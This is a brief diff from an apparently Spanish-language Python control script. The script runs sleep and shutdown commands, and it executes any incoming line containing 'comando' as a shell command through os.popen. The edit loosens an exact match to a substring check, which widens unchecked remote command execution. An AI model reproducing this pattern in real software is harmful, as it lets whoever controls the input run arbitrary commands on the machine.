@@ -97,7 +97,7 @@ while True:
             os.system('pmset sleepnow')
             output = os.popen('shutdown /s').read()
             print('Suspendiendo...')
-        if(line == 'comando'):
+        if 'comando' in line:
             comando = line.split(': ')
             output = os.popen(comando[1]).read()
         print(line , sep='',end ='\r')
